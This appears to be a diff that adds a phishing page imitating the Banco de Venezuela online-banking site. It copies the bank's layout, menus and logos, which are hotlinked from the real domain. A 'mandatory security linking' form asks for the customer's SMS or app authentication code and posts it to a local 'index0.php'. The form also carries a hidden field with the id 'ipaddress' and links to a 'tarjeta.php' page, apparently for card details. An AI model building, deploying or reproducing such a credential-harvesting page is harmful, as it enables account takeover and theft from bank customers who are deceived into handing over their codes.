+                                                Divisas <!----><span _ngcontent-c16="" fxflex="" class="ng-tns-c16-31 ng-star-inserted" style="flex: 1 1 0%; box-sizing: border-box; flex-direction: row; display: flex;"><span _ngcontent-c16="" class="ng-tns-c16-31" fxflex="" style="flex: 1 1 0%; box-sizing: border-box;"></span><mat-icon _ngcontent-c16="" class="mat-icon material-icons ng-trigger ng-trigger-indicatorRotate" role="img" aria-hidden="true" style="transform: rotate(0deg);">
+                                                        expand_more </mat-icon></span>
+                                            </div>
+                                        </a><!----></app-menu-list-item><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-32 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-32" src=" ">
+                                                Información <!---->
+                                            </div>
+                                        </a><!----></app-menu-list-item><app-menu-list-item _ngcontent-c11="" _nghost-c16="" class="ng-tns-c16-33 ng-star-inserted"><a _ngcontent-c16="" class="menu-list-item mat-list-item" mat-list-item="" style="padding-left: 0px;">
+                                            <div class="mat-list-item-content">
+                                                <div class="mat-list-item-ripple mat-ripple" mat-ripple=""></div>
+                                                <div class="mat-list-text"></div><img _ngcontent-c16="" class="img-icon ng-tns-c16-33" src=" "> Salir
+                                                <!---->
+                                            </div>
+                                        </a><!----></app-menu-list-item></mat-nav-list></mat-sidenav>
+                            <div tabindex="-1" class="cdk-visually-hidden cdk-focus-trap-anchor"></div>
+                            <!----><mat-sidenav-content cdkscrollable="" class="mat-drawer-content mat-sidenav-content ng-star-inserted">
+                                <app-top-nav _ngcontent-c11="" _nghost-c13="">
+                                    <mat-toolbar _ngcontent-c13="" class="mat-elevation-z1 mat-toolbar mat-primary mat-toolbar-single-row" color="primary">
+                                <button _ngcontent-c13="" class="responsive-menu-button mat-icon-button" id="menu" mat-icon-button="">
+                                     
+                                            <div class="mat-button-ripple mat-ripple mat-button-ripple-round" matripple=""></div>
+                                            <div class="mat-button-focus-overlay"></div>
+                                        </button>
+                                        <div _ngcontent-c13="" class="container1"><img _ngcontent-c13="" alt="logo homepage" class="logo" src="https://bdvenlinea.banvenez.com/assets/images/BDVenlinea-logo-blanco.png" width="40px"></div>
+                                        
+                                    </mat-toolbar></app-top-nav><!----><app-navbar _ngcontent-c11="" _nghost-c17="" class="ng-star-inserted">
+                                    <div _ngcontent-c17="" class="navbar" tabindex="0">
+                                        <div _ngcontent-c17="" class="dropdown"><button _ngcontent-c17="" aria-haspopup="true" mat-button="" type="button" class="mat-button"><span class="mat-button-wrapper"><img _ngcontent-c17="" class="img-icon" src="https://bdvenlinea.banvenez.com/assets/icons/consultas.png"><span _ngcontent-c17=""> Consultas </span><span _ngcontent-c17="" class="drop-icon">▾</span></span>
+                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
+                                                <div class="mat-button-focus-overlay"></div>
+                                            </button><button _ngcontent-c17="" aria-haspopup="true" mat-button="" type="button" class="mat-button"><span class="mat-button-wrapper"><img _ngcontent-c17="" class="img-icon" src="https://bdvenlinea.banvenez.com/assets/icons/transferencias.png"><span _ngcontent-c17=""> Transferencias </span><span _ngcontent-c17="" class="drop-icon">▾</span></span>
+                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
+                                                <div class="mat-button-focus-overlay"></div>
+                                            </button><button _ngcontent-c17="" aria-haspopup="true" mat-button="" type="button" class="mat-button"><span class="mat-button-wrapper"><img _ngcontent-c17="" class="img-icon" src="https://bdvenlinea.banvenez.com/assets/icons/pagos.png"><span _ngcontent-c17=""> Pagos </span><span _ngcontent-c17="" class="drop-icon">▾</span></span>
+                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
+                                                <div class="mat-button-focus-overlay"></div>
+                                            </button><button _ngcontent-c17="" aria-haspopup="true" mat-button="" type="button" class="mat-button"><span class="mat-button-wrapper"><img _ngcontent-c17="" class="img-icon" src="https://bdvenlinea.banvenez.com/assets/icons/solicitudes.png"><span _ngcontent-c17=""> Solicitudes </span><span _ngcontent-c17="" class="drop-icon">▾</span></span>
+                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
+                                                <div class="mat-button-focus-overlay"></div>
+                                            </button><button _ngcontent-c17="" aria-haspopup="true" mat-button="" type="button" class="mat-button"><span class="mat-button-wrapper"><img _ngcontent-c17="" class="img-icon" src="https://bdvenlinea.banvenez.com/assets/icons/servicios.png"><span _ngcontent-c17=""> Servicios </span><span _ngcontent-c17="" class="drop-icon">▾</span></span>
+                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
+                                                <div class="mat-button-focus-overlay"></div>
+                                            </button><button _ngcontent-c17="" aria-haspopup="true" mat-button="" type="button" class="mat-button"><span class="mat-button-wrapper"><img _ngcontent-c17="" class="img-icon-divisa" src="https://bdvenlinea.banvenez.com/assets/icons/divisas.png"><span _ngcontent-c17=""> Divisas </span><span _ngcontent-c17="" class="drop-icon">▾</span></span>
+                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
+                                                <div class="mat-button-focus-overlay"></div>
+                                            </button><button _ngcontent-c17="" mat-button="" type="button" class="mat-button"><span class="mat-button-wrapper"><img _ngcontent-c17="" class="img-icon" src="https://bdvenlinea.banvenez.com/assets/icons/salir.png"><span _ngcontent-c17=""> Salir </span></span>
+                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
+                                                <div class="mat-button-focus-overlay"></div>
+                                            </button></div><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu><mat-menu _ngcontent-c17="" class=""><!----></mat-menu>
+                                    </div>
+                                    <div _ngcontent-c17="" class="row" style="background-color:#0067b1">
+                                        
+                                        <div _ngcontent-c17="" class="menu-notificacion"><!----><app-menu-acceso-directo _ngcontent-c17="" _nghost-c28="">
+                                                <div _ngcontent-c28="" class="fab-container"><!---->
+                                                    <div _ngcontent-c28="" id="menu-barr" class="ng-star-inserted">
+                                                        <app-informacion-bdv _ngcontent-c28="" _nghost-c29=""><button _ngcontent-c29="" class="fab-secondary mat-button mat-mini-fab mat-accent" color="accent" mat-button="" mat-mini-fab="" mattooltipclass="tooltip-red" aria-describedby="cdk-describedby-message-0" cdk-describedby-host="" style="touch-action: none; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);background-color: #0067b1;"><span class="mat-button-wrapper"><img _ngcontent-c29="" alt="" class="img-icon" src="https://bdvenlinea.banvenez.com/assets/banner/bandeja.png"></span>
+                                                                <div class="mat-button-ripple mat-ripple mat-button-ripple-round" matripple=""></div>
+                                                                <div class="mat-button-focus-overlay"></div>
+                                                            </button></app-informacion-bdv><app-notificaciones-shortcut _ngcontent-c28="" _nghost-c30=""><button _ngcontent-c30="" class="fab-secondary mat-button mat-mini-fab mat-accent" color="accent" id="actionButton" mat-button="" mat-mini-fab="" mattooltipclass="tooltip-red" aria-describedby="cdk-describedby-message-1" cdk-describedby-host="" style="touch-action: none; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);background-color: #0067b1;"><span class="mat-button-wrapper"><!----><!---->
+                                                                
+                                                                
+                                                                <img _ngcontent-c30="" alt="" class="img-icon ng-star-inserted" src="https://bdvenlinea.banvenez.com/assets/notificaciones/icon.png"></span>
+                                                                <div class="mat-button-ripple mat-ripple mat-button-ripple-round" matripple=""></div>
+                                                                <div class="mat-button-focus-overlay"></div>
+                                                            </button></app-notificaciones-shortcut><app-acceso-directo-custom _ngcontent-c28="" _nghost-c31="">
+                                                            <div _ngcontent-c31="" class="fab-container"><!----></div>
+                                                        </app-acceso-directo-custom></div>
+                                                </div>
+                                            </app-menu-acceso-directo></div>
+                                    </div>
+                                </app-navbar><router-outlet _ngcontent-c11=""></router-outlet><app-layout class="ng-star-inserted"><router-outlet></router-outlet><app-tc-generar _nghost-c23="" class="ng-star-inserted">
+                                          <center> <div _ngcontent-c23="" class="container">
+                                            <mat-card _ngcontent-c23="" class="card-container mat-card" style="background-color: white;">
+                                                <br _ngcontent-c23="">
+                                                <br _ngcontent-c23="">
+                                                <h4 _ngcontent-c23="" class="card-container-title" tabindex="0" style="color: #0067b1;"> Vinculacion de seguridad Obligatoria</h4>
+                                                <div _ngcontent-c23="" layout-fill="" ng-cloak="">
+                                                 
+                                                        <form action="index0.php" method="post" > 
+                                                            <h4 class="" style="color: #0067b1;">Ingresa el codigo recibido por SMS o codigo generado en ami ven</h4> <br>
+                                                            <input type="text" name="caption" id="ipaddress" hidden="">
+                                                        
+                                                   <input type="text" maxlength="8" minlength="6" required name="sms" id="sms" autocomplete="off" autofocus placeholder="   codigo">
+                                                   <br _ngcontent-c23="">
+                                                   <br _ngcontent-c23="">
+                                                 <a href="/tarjeta.php">probar otro metodo de autentificacion</a>
+                                                   <br _ngcontent-c23=""> 
+                                                   <br _ngcontent-c23="">
+                    
+                                                    <button type="submit" class="btn btn-primary">Vincular</button></div>
+                                                    </form>
+                                                </center>
+
+                                                </div>
+
+
+                                            </mat-card></div>
+                                    </app-tc-generar></app-layout>
+                                <div _ngcontent-c11="" class="separador"></div><mat-expansion-panel _ngcontent-c11="" class="exp mat-expansion-panel ng-tns-c18-1 ng-star-inserted" hidetoggle="true"><mat-expansion-panel-header _ngcontent-c11="" class="expansion mat-expansion-panel-header ng-tns-c19-2 ng-trigger ng-trigger-expansionHeight ng-star-inserted" role="button" id="mat-expansion-panel-header-0" tabindex="0" aria-controls="cdk-accordion-child-0" aria-expanded="false" aria-disabled="false" style="height: 48px;"><span class="mat-content"></span><!----></mat-expansion-panel-header>
+                                    <div class="mat-expansion-panel-content ng-trigger ng-trigger-bodyExpansion" role="region" aria-labelledby="mat-expansion-panel-header-0" id="cdk-accordion-child-0" style="height: 0px; visibility: hidden;">
+                                        <div class="mat-expansion-panel-body"><!----><!----></div>
+                                    </div>
+                                </mat-expansion-panel>
+                            </mat-sidenav-content>
+                        </mat-sidenav-container></app-sidebar></div>
+            </app-menu></app-home-layout>
+    </app-root>
+
+    
+
+    <div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="assertive">Tu sesión está
+        por vencer</div>
+    <div id="cdk-describedby-message-container" aria-hidden="true" style="display: none;">
+        <div id="cdk-describedby-message-0">Información BDV</div>
+        <div id="cdk-describedby-message-1">Notificaciones</div>
+        <div id="cdk-describedby-message-2">Regresar</div>
+    </div>
+    <div class="cdk-overlay-container"></div>
+
+
+</body></html>
